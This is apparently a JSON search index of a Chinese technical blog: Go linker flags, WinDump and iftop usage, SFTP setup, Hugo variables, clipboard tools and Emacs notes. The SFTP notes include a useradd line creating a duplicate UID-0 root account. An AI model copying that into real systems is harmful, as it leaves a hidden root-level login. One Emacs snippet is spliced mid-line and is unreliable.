7\n\n以上代码的实现就是利用单字节字符的ASCII码小于0x80。至于要跳过几个字节，这要看具体是什么编码。接下来通过例子来看看a和A的区别：\n\n$GOPATH/src","tags":null},{"location":"//blog.pytool.com/Post/Go/2016-10-04 golang跨平台","title":"golang","text":"go build -ldflags \"h\"                                                                                                        2 ↵\ngithub.com/rinetd/drone-rsync\nusage: link [options] main.o\n  -B note\n        add an ELF NTGNUBUILD_ID note when using ELF\n  -D address\n        set data segment address (default -1)\n  -E entry\n        set entry symbol name\n  -H type\n        set header type\n  -I linker\n        use linker as ELF dynamic linker\n  -L directory\n        add specified directory to library path\n  -R quantum\n        set address rounding quantum (default -1)\n  -T address\n        set text segment address (default -1)\n  -V    print version and exit\n  -X definition\n        add string value definition of the form importpath.name=value\n  -a    disassemble output\n  -buildid id\n        record id as Go toolchain build id\n  -buildmode mode\n        set build mode\n  -c    dump call graph\n  -cpuprofile file\n        write cpu profile to file\n  -d    disable dynamic executable\n  -debugtramp int\n        debug trampolines\n  -dumpdep\n        dump symbol dependency graph\n  -extar string\n        archive program for buildmode=c-archive\n  -extld linker\n        use linker when linking in external mode\n  -extldflags flags\n        pass flags to external linker\n  -f    ignore version mismatch\n  -g    disable go package data checks\n  -h    halt on error\n  -importcfg file\n        read import configuration from file\n  -installsuffix suffix\n        set package directory suffix\n  -k symbol\n        set field tracking symbol\n  -libgcc string\n        compiler support lib for internal linking; use \"none\" to disable\n  -linkmode mode\n        set link mode\n  -linkshared\n        link against installed Go shared libraries\n  -memprofile file\n        write memory profile to file\n  -memprofilerate rate\n        set runtime.MemProfileRate to rate\n  -msan\n        enable MSan interface\n  -n    dump symbol table\n  -o file\n        write output to file\n  -pluginpath string\n        full path name for plugin\n  -r path\n        set the ELF dynamic linker search path to dir1:dir2:...\n  -race\n        enable race detector\n  -s    disable symbol table\n  -tmpdir directory\n        use directory for temporary files\n  -u    reject unsafe packages\n  -v    print link trace\n  -w    disable DWARF generation","tags":null},{"location":"//blog.pytool.com/cmd/2015-01-01 Windows命令 windump","title":"Windump的详细用法","text":"Npcapnmap/npcap: Nmap Project's packet sniffing library for Windows, based on WinPcap/Libpcap improved with NDIS 6 and LWF.\n\n\"WinDump 3.9.5.exe\" -D\n\"WinDump 3.9.5.exe\" -i 1 -s 1024 -B 4096-w windump.pcap\n\nREM -v\t输出一个稍微详细的信息，例如在ip包中可以包括ttl和服务类型的信息；\nREM -vv\t输出详细的报文信息；\nREM -c\t在收到指定的包的数目后，Windump就会停止；\nREM -T\t将监听到的包直接解释为指定的类型的报文，常见的类型有rpc\t（远程过程调用）和snmp（简单网络管理协议；）\n\nREM -n\t不把网络地址转换成名字\nREM –D  列出本机可供抓包的全部接口 -D\nREM -i\t指定监听的网络接口；-i 1\nREM -r\t从指定的文件中读取包(这些包一般通过-w选项产生)；-r windump.pcap\nREM -w\t直接将包写入文件中，并不分析和打印出来； -w windump.pcap\nREM -s  不使用默认的68个字节，更改从每个包中获取数据的字节数量 -s 1024  -S 0 后可以抓到完整的数据包\nREM （SunOS系统实际最小为96）。对于IP，ICMP，TCP和UDP包68个字节已足够，但是对命名服务和NFS包，他们的协议会被截断（见下面）。包被截断是因为在使用参数“[│proto]”输出时指定受限制的快照，proto是被截断协议层的名称。注意如果使用大的快照会增加处理包的时间，并且明显地减少包的缓存数量。也许会导致包的丢失。你应该将snaplen 设置成你感兴趣协议的最小数。当snaplen 为0时接收整个包。\nREM -B 以千字节为单位设置驱动缓存。默认缓存为1M（即1000） -B 4096\nREM 如果在获取数据包时有数据丢失，建议使用该参数增大核心缓存大小，因为驱动缓存大小对数据捕获性能有很大影响。\n\nREM -f 不用符号而用数字方式输出外部英特网地址 -F 使用文件作为过滤表达式的输入。命令行的其他部分会被忽略。\nREM -i 在接口上监听。如果没有指定，TCPDUMP将搜索系统接口列表中最小，被配置激活的接口（LOOPBACK接口除外）。可用最先匹配替换这种关系。在 WINDOWS中接口可以是网卡的名称，或是网卡的号码（-D参数可显示该号码）。内核为2。2或其后的LINUX系统，参数“ANY”可以获取所有接口的数据。应注意的是在混乱模式下不能使用“ANY”参数。\nREM -l 标准输出行缓存。如果你想在捕获数据时查看的话，这个参数很有用。\nREM 例如：“tcpdump -l │ tee dat” or “tcpdump -l   dat \u0026 tail -f dat”.” n 不要将地址（如主机地址，端口号）转换为名称 -N 不要打印主机名称的域名限定。如：如果你使用该参数，TCPDUMP会输出“NIC”而不是“NIC。DDN。MIL”。\nREM -m 从文件模块中载入SMI MIB 模块定义。这个选项可以为TCPDUMP载入多个MIB模块\nREM -O 不要运行包匹配代码优化器。只有在你怀疑优化器有问题时可以使用这个参数。\nREM -p 不要让接口处于“混乱”模式。注意接口可能由于其他原因处于“混乱”模式；因此“-p”不能用作以太网络主机或广播的缩写。\nREM -q 快速（安静？）输出。打印较少的协议信息，因此输出行更短。\nREM -r 从文件中读取包（与参数据-W一起使用）。如果文件是“-”就使用标准输入。\nREM -T 根据表达式将选中的数据包表达成指定的类型。当前已有的类型有CNFP（Cisco的网络流量协议），rpc（远端程序调用），rtp（实时程序协议）， rtcp（实时程序控制协议），snmp（简单网络管理协议），vat（可视单频工具），和wb（分布式白板）。 -R 假设ESP/AH包遵守旧的说明（RFC1825到RFC1829）。如果该参数被指定，TCPDUMP不打输出域。因为在ESP/AH说明中没有协议版本，TCPDUMP就无法推断出其版本号。 -S 输出绝对TCP序列号，而不是相对号。\nREM -t 每个捕获行不要显示时间戳。 -tt 每个捕获行显示非格式化的时间时间戳。\nREM -v 详细输出。例如，显示生存时间TTL，标识符，总长度和IP数据包的选项。也进行额外的包完整性较验，如验证IP和ICMP的头标较验值。\nREM -vv 更为详细的输出。例如，显示NFS中继包中的其他域。\nREM -vvv 很详细的输出。如，完全输出TELNET SB… SE选项。带-X参数的TELNET，打印并以十六进制输出。\nREM -w 不对原始数据包解析打印而是转到文件中去。以后可用-r选项打印。当文件名为“-”表示标准输出。 -x 以十六进制（去除链路层头标）输出每个数据包。输出整个包的小部分或snaplen 个字节。\nREM -X 输出十六进制同时，输出ASCII码。如果-x也被设置，数据包会以十六制/ASCII码显示。这对于分析新协议非常方便。如果-x也没有设置，一些数据包的部分会以十六制/ASCII码显示。 Win32特殊扩展\nREM -D 显示系统上可用的网卡列表。该参数将返回每块网卡的号码，名称和描述。\n\nREM 1、windump –D  列出本机可供抓包的全部接口。\n\n\tREM windump –i 2(网卡序号) 指定要抓第二块网卡的包\n\nREM 2、windump –n 不解析主机名，直接显示抓包的主机IP地址。\n\nREM 3、windump –n host 192.168.1.2  只抓关于192.168.1.2主机的包（不管包的方向）。\n\nREM 4、windump –n host 192.168.1.2 and udp port 514 只抓关于主机192.168.1.2上udp协议端口为514的包。\n\nREM 同理，我也可以抓所有tcp协议23端口的包，命令如下：\n\nREM windump –n host 192.168.1.2 and tcp port 23\n\nREM 或者，我只抓udp 514端口的包，不管ip是多少，命令如下：\n\nREM windump –n udp port 514\n\nREM 5、windump –n net 133.160 抓133.160网段的包，不管包的方向。\n\nREM 同理，我也可以抓所有133.160网段的且tcp端口为3389的包，命令如下：\n\nREM windump –n net 133.160 and tcp port 3389\n\nREM 6、windump –n host ! 133.191.1.1 抓所有非133.191.1.1有关的包。\n\nREM 同理，我要抓除了133.191.1.1之外的所有机器的tcp端口为3389的包，命令如下：\n\nREM windump –n host ! 133.191.1.1 and tcp port 3389\n\nREM 7、windump –n dst host 133.191.1.1 抓所有发送到133.191.1.1的包。\n\nREM 同理，可以用and 或or参数，如：\n\nREM windump –n dst host 133.191.1.1 ort src host 101.1.1.1","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 ssh sftp","title":"完全使用 SFTP 替代 FTP","text":"---\n如何开启sftp\n启用internal-sftp [必须 否则禁止登陆的用户无法使用sftp]\n  sed -i 's|Subsystem sftp /usr/lib/openssh/sftp-server|Subsystem sftp internal-sftp|' /etc/ssh/sshdconfig\n创建sftp用户\n   useradd -o -r -u 33 -g www-data -c sftp -d /home/wwwroot/default/bizchinalinyi -s /usr/sbin/nologin sftp \n   useradd -o -r -u 1000 -g ftp -c sftp -d /docker/destoon/bizchinalinyi -s /usr/sbin/nologin sftp \n   useradd -o -r -u 0 -g root -c sftp -d /docker/tomcat/ -s /usr/sbin/nologin tomcat  info Top. 123\n修改密码\n   passwd sftp  \n登陆\n  sftp -P 3009 sftp@ \n\njbw\nuseradd -o -r -u 33 -g www-data -c sftp -d /docker/php5/jbw/public/uploads -s /usr/sbin/nologin sftpjbw","tags":null},{"location":"//blog.pytool.com/Post/Go/2016-10-04 golang项目","title":"golang project","text":"go 项目汇总\n\n数据库  gorm\nhttps://github.com/jinzhu/gorm\nhttp://jinzhu.me/gorm/\nChirp\nChirp is simplified Twitter written in Angular 2 and Go. You can start\nfully working website with just one line.\ngin\n\n goapi\ngithub.com/dcwangmit01/goapi\njust-bs\nsun-slaven/just-bs\n\n 权限控制\nPearson Application Engineering\ngin + rbac\nTensor\n Comprehensive web-based automation framework and Centralized infrastructure management platform\npearsonappeng/tensor: \n\n git clone https://github.com/pearsonappeng/tensor.git $GOPATH/src/github.com/pearsonappeng/tensor\n\n 权限控制 casbin\ngo get github.com/hsluoyz/casbin\n\nheartbeat\ngo get -u github.com/noaway/heartbeat\n\n base\nGo语言错误处理\n深度剖析interface\n深度剖析channel\ngolang信号处理\nGo的文件操作\nGo语言错误处理\nGolang中defer、return、返回值之间执行顺序\ngo语言的http-中间件实现\nGolang连接数据库\nGo文件操作大全\n深入Go UDP编程\nGolang新开发者要注意的陷阱和常见错误\n\nRPC\n Thrift RPC 使用指南实战(附golang\u0026PHP代码)\n Golang通过Thrift框架完美实现跨语言调用\nGo使用gRPC与Protocol Buffers构建高性能API 服务\n\n 性能\nGo程序调试、分析与优化\nCockroachDB GC优化总结\n从Baa开发中总结Go语言性能渐进优化\n\n反射\nGo语法简略 － 反射\nGo语法简略 － 依赖注入\n\n 测试\n如何测试 Go 代码 - 单元测试\n\n扩展\nGo net/http 超时指南\nGo 调度器跟踪\nGo 1.6中值得关注的几个变化\nGo,Makefile与自动程序版本号的实现\n\n 教程\nGo by Example 中文\nGolang操作数据库\n\n其他\nUnknwon's go-study-index\n优姬","tags":null},{"location":"//blog.pytool.com/Other/2017-10-31 i18n","title":"i18n","text":"[i18n]\nLANGS = en-US,zh-CN,zh-HK,de-DE,fr-FR,nl-NL,lv-LV,ru-RU,ja-JP,es-ES,pt-BR,pl-PL,bg-BG,it-IT\nNAMES = English,简体中文,繁體中文,Deutsch,Français,Nederlands,Latviešu,Русский,日本語,Español,Português do Brasil,Polski,български,Italiano\n\nCrowdin","tags":null},{"location":"//blog.pytool.com/Post/基础/2015-12-09 图像处理","title":"图像服务image server","text":"格式转换Transform 缩放resize Fit 剪裁crop 旋转rotate 质量quality 翻转Flip  放大upscale\n\nSearch · image server\nwww.imageflow.io\n\nwantedly/nginx-image-server: Dockerfile for Dynamic Image Transformation Server with Nginx and Small Light module\n\nIntroduction to picfit, an image resizing server written in Go – Medium\nthoas/picfit: An image resizing server written in Go\n\n{\n  \"storage\": {\n    \"src\": {\n      \"type\": \"[STORAGE]\"\n    }\n  },\n  \"options\": {\n    \"enableupload\": true\n  }\n}\nstorage.src 指定根目录 path以此为根目录\noptions.enableupload 允许上传\n form表单上传文件\ncurl -F data=@9.jpg -i localhost:3001/upload\nGeneral image 请求地址\nhttp://localhost:3001/display?url=http://i1.piimg.com/585302/243d3a3c97d7877a.png\u0026w=600\u0026h=0\u0026op=resize\u0026upscale=0\nhttp://localhost:3001/display/resize/1000x1000/src/2017-02-12-132835498x284scrot.png\n\nhttp://localhost:3001/{method}?url={url}\u0026path={path}\u0026w={width}\u0026h={height}\u0026upscale={upscale}\u0026sig={sig}\u0026op={operation}\u0026fmt={format}\u0026q={quality}\u0026deg={degree}\u0026pos={position}\n方法{method} ：Display Redirect Get Upload\n操作Operations ：Resize  Thumbnail Flip Rotate\npath | url\nwidth \u0026 height  \nupscale 放大\nquality jpeg质量\ndegree 角度 90 180 270 rotate有效\nposition 翻转参考点 flip 有效","tags":null},{"location":"//blog.pytool.com/tool/剪切板","title":"Linux xclip xsel用法","text":"Linux: xclip,pbcopy,xsel用法 terminal (mac , ubuntu)\n\n    博客分类： Ubuntu / Mac / Github / Aptana / Nginx / Shell / Linux\n\nWindows下\n\n使用系统自带的clip命令。\n位于C:\\Windows\\system32\\clip.exe。\n\n示例：\nC代码  收藏代码\n\n    echo Hello | clip  \n     将字符串Hello放入Windows剪贴板  \n\n    dir | clip  \n    # 将dir命令输出（当前目录列表）放入Windows剪贴板  \n\n    clip \u003c README.TXT    \n    # 将readme.txt的文本放入Windows剪贴板  \n\n    echo | clip  \n    # 将一个空行放入Windows剪贴板，即清空Windows剪贴板  \n\nUbuntu下\n\nubuntu下的用户可以只用apt-get来安装：\nC代码  收藏代码\n\n    sudo apt-get install xclip  \n\n其他发行版的用户可以选择自己的安装方式，也可以用源码编译安装，xclip项目的主页是：http://sourceforge.net/projects/xclip/\n\nxclip可以将内容输出到‘X’的剪切板中，比如：\nC代码  收藏代码\n\n    echo \"Hello, world\" | xclip  \n\n执行这个命令后你就可以用鼠标中键来在X程序中将内容粘贴出来。但是更多的时候，我们需要不仅仅把内容输出到‘X’的剪切板中，而是希望可以在GUI程序 中用ctrl + v也可以粘贴（比如，输出到gnome的剪切板中），下面这段命令就可以让你将内容输出到gnome的剪切板中：\nC代码  收藏代码\n\n    echo \"Hello, world\" | xclip -selection clipboard  \n\n再在一个GUI程序中按下ctrl + v，看下是不是粘贴上去了呢？顺着这个命令，我也重新写了一下ifconfig，让它在执行后输入内容到终端的同时，也将ip地址输出到剪切板中，因为通常情况下，查看ifconfig就是为了获取机器的ip地址：\nC代码  收藏代码\n\n    alias ifconfig='/sbin/ifconfig \u0026\u0026 echo /sbin/ifconfig | sed -n 2p | awk \"{ print \\\\$2 }\" | grep -o \"[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\" | xclip -selection clipboard'  \n\n或者\nC代码  收藏代码\n\n    xclip -sel clip \u003c file   \n\n此时你就可以在网页等编辑框CTRL+V了。\n\n项目主页：http://sourceforge.net/projects/xclip/\n命令man page: http://linux.die.net/man/1/xclip\n\n-i, -in\n    read text into X selection from standard input or files (default)\n-o, -out\n    prints the selection to standard out (generally for piping to a file or program)\n-f, -filter\n    when xclip is invoked in the in mode with output level set to silent (the defaults), the filter option will cause xclip to print the text piped to standard in back to standard out unmodified\n-l, -loops\n    number of X selection requests (pastes into X applications) to wait for before exiting, with a value of 0 (default) causing xclip to wait for an unlimited number of requests until another application (possibly another invocation of xclip) takes ownership of the selection\n-d, -display\n    X display to use (e.g. \"localhost:0\"), xclip defaults to the value in $DISPLAY if this option is omitted\n\nLinux下\n\n使用xsel命令。\n\n示例：\nC代码  收藏代码\n\n    cat README.TXT | xsel  \n    cat README.TXT | xsel -b # 如有问题可以试试-b选项  \n    xsel \u003c README.TXT  \n    # 将readme.txt的文本放入剪贴板  \n\n    xsel -c  \n    # 清空剪贴板  \n\nMac下\n\n使用pbcopy命令。 # 对应有个pbpaste命令。\n\n示例：\nC代码  收藏代码\n\n    echo 'Hello World!' | pbcopy  \n    # 将字符串Hello World放入剪贴板  \n\nC代码  收藏代码\n\n    cat myFile.txt | pbcopy  \n\nC代码  收藏代码\n\n    pbpaste   file.txt  \n\n要复制结果又想看到命令的输出\n\n命令的结果输出时，如果给复制命令（即上面提到的命令clip、xsel、pbcopy）那么命令输出就看不到了。如果你想先看到命令的输出，可以下面这么做。\nC代码  收藏代码\n\n    $ echo 'Hello World!' | tee tmp.file.txt  \n    Hello World!  \n    $ xsel \u003c tmp.file.txt  \n    $ rm tmp.file.txt  \n\n即先使用tee命令把输出输到控制台和一个文件中。命令执行完成后，再把输出的内容放到剪贴板中。\n\n复制SSH的公有KEY\n\n使用下面的命令：\nC代码  收藏代码\n\n    $ pbcopy \u003c ~/.ssh/id_rsa.pub  \n\n注：不同系统使用不同的复制命令。避免用文本编辑器打开这个文件、选中文本、CTRL + C这样繁琐操作。","tags":null},{"location":"//blog.pytool.com/hugo/hugo_variable","title":"hugo 模板变量","text":"Data 变量\n注：数据以键值对形式保存在模板变量中，键由数据文件所在目录名、文件名以及变量名来决定，比如定义在数据文件 data/author/en/fiction.toml 中的变量 names ，最终在模板中通过 .Site.Data.author.en.fiction.names 来引用。\n\n变量\n\n    变量也是比较枯燥的，大概看看就可以了，需要的时候再来细细的揣摩。\n\n变量是用于存储数据的容器，hugo的模板神奇之处就在于这些强大的变量，它们不仅仅是配置文件中的一个属性，或者内容文件头的一个属性，内容本身，而是涵盖了很多方面的。\n\n出生与CMS世家的hugo作者十分了解我们只做模板需要哪些变量，这些变量在hugo新版本发布的时候还在不停的增加，本中文手册适时更新。\n特殊的点\n\n{{ . }}\n\n在hugo模板里面， 点“.” 代表的是上下文，不同的模板里面上下文环境是不同的。它可以用对象的this来理解。\n\n在全文中的点，和在循环中的点是不一样的，如果要在循环中访问全文中的点（对象），则需要赋值给某个参数。\n\n例子一：\n\n{{ $title := .Site.Title }}\n{{ range .Params.tags }}\n  li\n    a href=\"{{ $baseurl }}/tags/{{ . | urlize }}\"{{ . }}/a\n    {{ $title }}\n  /li\n{{ end }}\n\n在例子中，站点的标题”Site.Title“在range里面是反问不到的，range里面的点代表Params.tag对象，通过$title把站点标题传递到迭代里面。\n\n    可以使用”$“在变量前面，在全局的范围访问变量，这是赋值给中间变量的简化方式。\n\n页面变量\n\n    神奇的点“.”在所有的可用变量前面，千万别忘了哦！\n\n下面是页面能够使用的变量。\n\n    .Title 内容的标题，来自于内容文件的title设置\n    .Content 内容本身，来自于文件头\n    .Summary 摘要，可以手动设置断点和“更多”链接\n    .Truncated 布尔值，判断是否截断\n    .Description 内容的描述，来自内容文件头\n    .Keywords 内容的meta关键词，用于搜索引擎SEO\n    .Date 内容的相关日期\n    .PublishDate 内容的发布日期\n    .Type 内容的类型\n    .Section 内容所属章节\n    .Permalink 页面永久链接\n    .RelPermalink 页面相对永久链接\n    .LinkTitle 设置所链接的目标的标题为链接的标题\n    .Taxonomies 复数字段的分类\n    .RSSLink 链接到分类的rss\n    .TableOfContents 内容列表\n    .Prev 上一页（基于日期）\n    .Next 下一页\n    .PrevInSection 上一节（基于日期）\n    .NextInSection 下一节\n    .FuzzyWordCount 相似的内容\n    .WordCount 字数统计\n    .ReadingTime 读取时间\n    .Weight 权重\n    .RawContent 直接读取md文件内容，排除文件头\n    .Draft 布尔值，是否为草稿\n    .IsNode 是字段，page都是“否”\n    .IsPage 是页面，page页面都是“是”\n    .Site 站点（参看下面）\n    .Hugo hugo字段（参看下面）\n\n页面参数\n\n在任何地方都可以访问的页面参数，比如下面的标签和分类\n\n    .Params.tags\n    .Params.categories\n\n    参数为自定义的，所有参数都是小写的。\n\n节点变量\n\n节点变量可以被不是详细页的其他页面调用，例如首页、列表页、分类术语页等。\n\n    .Title 内容的标题\n    .Date 内容发布日期\n    .Permalink 节点永久链接\n    .URL 节点的相对路径\n    .Ref(ref) 返回永久链接\n    .RelRef(ref) 返回永久相对链接\n    .RSSLink 分类的rss链接\n    .Data 这种类型的数据\n    .IsHome 是否是首页，首页永远都是是\n    .IsNode 是否是节点，节点永远是“是”\n    .IsPage 是否是页面，节点永远是否\n    .Site 站点（参看下面）\n    .Hugo hugo（参看下面）\n\n分类术语变量\n\n    .Data.Singular 术语的单数名称\n    .Data.Plural 术语的复数名称\n    .Data.Pages 分类列表页面\n    .Data.Terms 术语自己\n    .Data.Terms.Alphabetical 条目按字母排序\n    .Data.Terms.ByCount 条目按名气排序\n\n站点变量\n\n    .Site.BaseURL 站点的基本路径\n    .Site.Taxonomies 整个站点的分类\n    .Site.Indexes 站点版本\n    .Site.Pages 以日期排序的所有内容数组\n    .Site.Params 配置文件中的变量\n    .Site.Sections 站点顶级目录\n    .Site.Files 所有的站点资源文件\n    .Site.Menus 所有的站点菜单\n    .Site.Title 一个字符串表示的站点标题\n    .Site.Author 配置文件定义的作者地图\n    .Site.LanguageCode 一个字符串表示的站点语言\n    .Site.DisqusShortname 配置文件定义的短字符串\n    .Site.Copyright 字符串定义的版权信息\n    .Site.LastChange 最后更新的内容\n    .Site.Permalinks 配置文件复写的永久链接\n    .Site.BuildDrafts 配置文件中定义的是否建立草稿\n    .Site.Data 自定义数据，参看数据文件章节\n\nHugo变量\n\n    .Hugo.Generator 标记mate数据，便于官方跟踪.\n    .Hugo.Version hugo 版本\n    .Hugo.CommitHash git 二进制散列\n    .Hugo.BuildDate 创建日期\n\n总结\n\n变量存在上下文关系，很多变量单独输出是没有任何显示的，另外需要注意变量的 首字母大写 。\n\n函数好比搭积木的方法，变量就是积木。熟悉了hugo模板函数和变量，已经可以尝试使用hugo的规则自己搭建积木了。\n\n在模板手册到这里的时候，大家是否在思考如下问题：\n\n    模板文件怎么划分合理？\n    CSS放什么地方，怎么样链接进来？\n    js和js库放什么地方，怎么链接进来？\n    head标签种很多信息怎么而来？\n    title到底是谁的title，站点的，还是文章的，还是列表的？\n    导航怎么而来，怎么更新，怎么支持中文？\n\n讲了那么多枯燥的函数和变量，下一节要来点湿漉漉的润润心灵。","tags":null},{"location":"//blog.pytool.com/Edit/2015-01-12 文本编辑 Emacs","title":"文本编辑 Emacs","text":"---\r\nreddit\r\n论坛\r\nEmacsist\r\n21 天学会 Emacs 大纲\r\nemacs-china/Spacemacs-rocks\r\nlujun9972/emacs-document\r\nemacs-china/hello-emacs: emacs新手入门资料汇集地\r\nemacs-tw/emacs-101: Emacs 101 - 一本讓你學 Emacs 不再學得靠北靠母的美好的新手求生指南\r\nEmacs Rocks!\r\nEmacs相关中文问题以及解决方案\r\n\r\nEmacs笔记\r\nEmacs入门系列：3分钟学会Emacs基本操作  \r\n从零开始——Emacs 安装配置使用教程 2015  \n\nemacs autoload 集装箱 · LinuxTOY\n\n那就从妖艳酷炫的快捷键开始吧！\nEmacs 键映射(keymap) - joans123的专栏 - 博客频道 - CSDN.NET\nemacs键盘映射 - 追风人 - 博客园\n\n从 Vim 迁移到 spacemacs - 技术翻译 - 开源中国社区\n\nFrom Vim to Emacs+Evil chaotic migration guide\nelisp语法\nemacslisp光速入门 - 大雄 blog\nelisp笔记\nelisp半本manual的量\nEmacs Lisp 语法速成\r\nEmacs Lisp\r\n淺談 Lisp 裡面的 Lambda | 東北角的小徑\r\nANSI Common Lisp 中文翻譯版 — ANSI Common Lisp 中文版\r\nEmacs Lisp 简明教程 - 水木社区Emacs版\r\nElisp 文档笔记  \r\nLisp语言：函数的可选参数，剩余参数以及关键字参数\r\nspacemacs\r\nSpacemacs 使用总结  \r\nSpacemas的Dotfile配置 - 小幻的博客 - 博客频道 - CSDN.NET\r\norg-mode\r\nOrg Customization\r\nEmacs configuration file\r\n\r\nThe Org Manual\r\nThe Org Manual 笔记\r\nhello-emacs/org-manual.org \r\nOrg-mode 简明手册\r\nEmacs Org Mode 小结（长文慎入……\r\nEmacs月月积累（终结篇）：熟练使用org-mode管理日常事务 \r\nGTD\r\nOrg Mode - Organize Your Life In Plain Text!\r\n用Org-mode实现GTD\r\nOrg-mode,最强的任务管理利器，没有之一\r\nGTD精要 - 心内求法 - 博客园\r\n使用emacs的org-mode进行时间管理(五)——归档 - 暗日 - 51CTO技术博客\r\n\r\norg-capture\r\nOrg-Mode Beginners Customization Guide\r\n\r\n关于org-capture-templates配置代码的解释\r\n窗口\r\nEmacs中的窗口操作 · ZMonster's Blog\r\nC-x 0: 删除当前窗口\r\nC-x 1: 删除当前窗口外的其他窗口\r\n表格\r\n强大的Org mode(2):任务管理\r\n强大的 Org mode(3): 表格的基本操作及公式、绘图 · ZMonster's Blog\r\n\r\n小技巧\r\norg-mode 里面自动归档任务 - wd and cc\r\n使用 Emacs Org-mode 构建笔记系统 \r\nHow to Install Packages Using ELPA  \r\nUsing Font Awesome in the Emacs mode line \r\n在SpacEmacs 中设置 helm-gtags 快捷键  \r\nemacs-document/教你用Org-mode管理dotfiles.org\r\nSpacemacs通过选择性开启pangu-spacing加快打开大文件的速度 \r\n##########################################################################\r\n\r\nemacs --debug-init\r\n编译安装emacs最新版\r\n\r\ngit clone git://git.savannah.gnu.org/emacs.git\r\n$ cd emacs\r\n./autogen.sh\r\n\r\nsudo apt-get -y install autoconf          autoconf (need at least version 2.65)\r\nsudo apt-get -y install texinfo              # You do not seem to have makeinfo   = 4.13\r\nsudo apt-get -y install libgtk2.0-dev    # --with-x-toolkit=no  | --without-x\r\nsudo apt-get -y install libtiff5-dev     # --with-tiff=no --with-jpeg=no\r\nsudo apt-get -y install libgnutls-dev    # --with-gnutls=no\r\nsudo apt-get -y install libxpm-dev       # --with-xpm=no\r\nsudo apt-get -y install libgif-dev       # --with-gif=no\r\nsudo apt-get -y install libncurses5-dev\r\nsudo apt-get -y install libdbus-1-dev    # dbus\r\nsudo apt-get -y install mailutils\r\n./configure  \r\n./configure --without-x --without-pop --with-mailutils\r\nmake \u0026\u0026 make install\r\n\r\ngif 用 byzanz 录制，按键显示用 screen-key，系统 Linux\r\n最近了解到新的一种办法，就是安装 command-log-mode ，会在 Emacs 中显示触发过的快捷键\r\nInstall\r\n git clone https://github.com/syl20bnr/spacemacs ~/.emacs.d \r\n git clone https://github.com/zilongshanren/spacemacs-private.git ~/.spacemacs.d \r\n 字体\r\nSource Code Pro\r\n\r\n\r\nemacs --daemon\r\nemacscliet -c\nemacsclient -t\nhttpproxy=http://127.0.0.1:8087 emacs -nw\n\nsudo apt-get install global\nan Emacs \"jump to definition\" package  dumb-jump\n\n输入半边括号可以用\nC-q )\n\nEmacs GUI 在 read-only-mode (如 spacemacs-buffer-mode) 内如何用鼠标左击代替键盘 Enter\n (define-key spacemacs-buffer-mode-map [mouse-2] 'widget-button-press)\n\n执行 elisp 语句\n将光标移到表达式内部，然后执行 M-C-x（即 Alt + Ctrl + x 键）；\n将光标放到表达式最后一个封闭的括号的后面，然后执行 C-x C-e。\n\n?x 可以获得字符 x 的 ASCII 码\n例如 ?a 的求值结果是 ASCII 码 97\n\n二进制数，前缀是 #b，例如 #b10010110；\n八进制数：#o[0-7]+，例如 #o377；\n十六进制数，前缀是 #x，例如 #xabcd\n\n!-- 常见的 Emacs 的快捷键设置主要有四种类型， --\n全局快捷键:\n(global-set-key (kbd \"A\") 'your-command)\n(global-unset-key (kbd \"grm\"))\n\n全局映射键:\n(define-key key-translation-map (kbd \"A\") (kbd \"B\"))\n\n基于 Major-Mode 的局部快捷键，以及\n(local-set-key (kbd \"A\") 'your-command)\n(local-unset-          (\"laptop\" . ?l) (\"pc\" . ?p)))\n\n定义需用到的快捷键\na-z\t\t\t\t直接插入已定义的 TAGS\nTAB\t\t\t\t切换到手动输入 TAGS\nSPC\t\t\t\t清空所有 TAGS\n!\t\t\t\t关闭或开启互不相容的 TAGS 标记\nq/C-g\t\t\t\t退出设置key (kbd \"grm\"))\n\n基于 Minor-Mode 的局部快捷键，对应的命令分别是\n(define-key your-minor-mode-map (kbd \"A\") 'your-command)\n(define-key evil-normal-state-map \"q\" 'evil-force-normal-state )\n(define-key evil-normal-state-map \"q\" nil )\n\n(define-key global-map (kbd \"C-c t\") 'org-capture)\n\n!-- 拼接字符 --\n(setq file \"~/org-notes/\")\n(setq file1 (file/note.org)\n迭代list的元素 dolist\n常用命令\n;; 关闭其它窗口\n(delete-other-windows)\n;; record\n(define-key evil-normal-state-map \"q\" 'evil-record-macro)\n M-x org-babel-tangle  +BEGINSRC conf :tangle ~/.aliases 自动生成dotfiles\n##############\n\nUndo\nCtrl-/\nC-S--\n Redo\nC-x u\nM-S--\n\nC-x 0: 删除当前窗口\nC-x 1: 删除当前窗口外的其他窗口","tags":null},{"location":"//blog.pytool.com/Post/Go/golang语言包用法/goconfig","title":"golang中goconfig包使用解析","text":"---\nchenbaoke的专栏","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 iftop","title":"Linux命令 iftop","text":" iftop 界面相关说明\n\n界面上面显示的是类似刻度尺的刻度范围，为显示流量图形的长条作标尺用的。\n\n中间的= =这两个左右箭头，表示的是流量的方向。\n\nTX：发送流量\nRX：接收流量\nTOTAL：总流量\nCumm：运行 iftop 到目前时间的总流量\npeak：流量峰值\nrates：分别表示过去 2s 10s 40s 的平均流量\n\n iftop 相关参数\n常用的参数\n-i 设定监测的网卡，如：# iftop -i eth1\n-B 以 bytes 为单位显示流量(默认是 bits)，如：# iftop -B\n-n 使 host 信息默认直接都显示 IP，如：# iftop -n\n-N 使端口信息默认直接都显示端口号，如: # iftop -N\n-F 显示特定网段的进出流量，如# iftop -F 10.10.1.0/24 或# iftop -F 10.10.1.0/255.255.255.0\n-h（display this message），帮助，显示参数信息\n-p 使用这个参数后，中间的列表显示的本地主机信息，出现了本机以外的 IP 信息;\n-b 使流量图形条默认就显示;\n-f 这个暂时还不太会用，过滤计算包用的;\n-P 使 host 信息及端口信息默认就都显示;\n-m 设置界面最上边的刻度的最大值，刻度分五个大段显示，例：# iftop -m 100M\n\n进入 iftop 画面后的一些操作命令(注意大小写)\n按 h 切换是否显示帮助;\n按 n 切换显示本机的 IP 或主机名;\n按 s 切换是否显示本机的 host 信息;\n按 d 切换是否显示远端目标主机的 host 信息;\n按 t 切换显示格式为 2 行/1 行/只显示发送流量/只显示接收流量;\n按 N 切换显示端口号或端口服务名称;\n按 S 切换是否显示本机的端口信息;\n按 D 切换是否显示远端目标主机的端口信息;\n按 p 切换是否显示端口信息;\n按 P 切换暂停/继续显示;\n按 b 切换是否显示平均流量图形条;\n按 B 切换计算 2 秒或 10 秒或 40 秒内的平均流量;\n按 T 切换是否显示每个连接的总流量;\n按 l 